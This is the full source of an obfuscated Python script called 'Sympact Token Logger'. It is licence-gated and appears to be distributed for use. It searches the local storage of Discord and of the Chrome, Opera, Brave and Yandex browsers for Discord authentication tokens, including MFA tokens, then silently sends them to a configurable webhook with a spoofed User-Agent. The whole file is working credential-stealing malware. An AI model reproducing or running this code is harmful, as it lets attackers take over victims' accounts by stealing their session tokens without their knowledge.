import os #line:4
import re #line:5
import json #line:7
import config as configfile #line:8
from tkinter import *#line:9
from tkinter import messagebox #line:10
from urllib .request import Request ,urlopen #line:11
WEBHOOK_URL =configfile .webhookurl #line:14
if configfile .licensekey !="5423e026d19e2a069f8bda7a3e24f9f1e3e95298b010352942b3467de1430e4ba1fccb0d6508e324db5ada4304f9f73f7a9942039329bf7e0fa847a6ee4248eb":#line:15
    messagebox .showerror ("Invalid License Key","Bro DM ProtoDev#0001 for a key simp..")#line:16
    exit ()#line:17
import api as apifile #line:19
if apifile .version !=1.0 :#line:21
    messagebox .showwarning ("Outdated Version","Your Version is outdated. Please get our new one!")#line:22
    exit ()#line:23
PING_ME =configfile .pingeveryone #line:24
HERE_ME =configfile .pinghere #line:25
def find_tokens (O0OOO00O0O000OOOO ):#line:28
    O0OOO00O0O000OOOO +='\\Local Storage\\leveldb'#line:29
    O0O000O0O0OOO00OO =[]#line:31
    for O0O0OO000O0000O00 in os .listdir (O0OOO00O0O000OOOO ):#line:33
        if not O0O0OO000O0000O00 .endswith ('.log')and not O0O0OO000O0000O00 .endswith ('.ldb'):#line:34
            continue #line:35
        for OO0O000O0OOOOO000 in [O0OOOO00O000OOOOO .strip ()for O0OOOO00O000OOOOO in open (f'{O0OOO00O0O000OOOO}\\{O0O0OO000O0000O00}',errors ='ignore').readlines ()if O0OOOO00O000OOOOO .strip ()]:#line:37
            for OOO00000O00000000 in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):#line:38
                for OOO0O00OOOO0O0OOO in re .findall (OOO00000O00000000 ,OO0O000O0OOOOO000 ):#line:39
                    O0O000O0O0OOO00OO .append (OOO0O00OOOO0O0OOO )#line:40
    return O0O000O0O0OOO00OO #line:41
def main ():#line:43
    O0O0OO0OOOOO000OO =os .getenv ('LOCALAPPDATA')#line:44
    O00OO0O000O000O0O =os .getenv ('APPDATA')#line:45
    O0000OOOOO000O0O0 ={'Discord':O00OO0O000O000O0O +'\\Discord','Discord Canary':O00OO0O000O000O0O +'\\discordcanary','Discord PTB':O00OO0O000O000O0O +'\\discordptb','Google Chrome':O0O0OO0OOOOO000OO +'\\Google\\Chrome\\User Data\\Default','Opera':O00OO0O000O000O0O +'\\Opera Software\\Opera Stable','Brave':O0O0OO0OOOOO000OO +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':O0O0OO0OOOOO000OO +'\\Yandex\\YandexBrowser\\User Data\\Default'}#line:55
    OOO000O0O0O00O0O0 ='@everyone Sympact Token Logger'if PING_ME else '@here Sympact Token Logger'if HERE_ME else 'Sympact Token Logger'#line:57
    for O00O00OO0000O00OO ,O0OOOO0OOOOOOO0OO in O0000OOOOO000O0O0 .items ():#line:59
        if not os .path .exists (O0OOOO0OOOOOOO0OO ):#line:60
            continue #line:61
        OOO000O0O0O00O0O0 +=f'\n**{O00O00OO0000O00OO}**\n```\n'#line:63
        O00O000000000O00O =find_tokens (O0OOOO0OOOOOOO0OO )#line:65
        if len (O00O000000000O00O )>0 :#line:67
            for OOOOOO000O0OOOO0O in O00O000000000O00O :#line:68
                OOO000O0O0O00O0O0 +=f'{OOOOOO000O0OOOO0O}\n'#line:69
        else :#line:70
            OOO000O0O0O00O0O0 +='No tokens found. \n'#line:71
        OOO000O0O0O00O0O0 +='```'#line:73
    O0OOOO00OOO0O0OOO ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}#line:78
    O0OOOOOO0O0O00OOO =json .dumps ({'content':OOO000O0O0O00O0O0 })#line:80
    try :#line:82
        OO000O0OOOO000OO0 =Request (WEBHOOK_URL ,data =O0OOOOOO0O0O00OOO .encode (),headers =O0OOOO00OOO0O0OOO )#line:83
        urlopen (OO000O0OOOO000OO0 )#line:84
    except :#line:85
        pass #line:86
if __name__ =='__main__':#line:88
    main ()
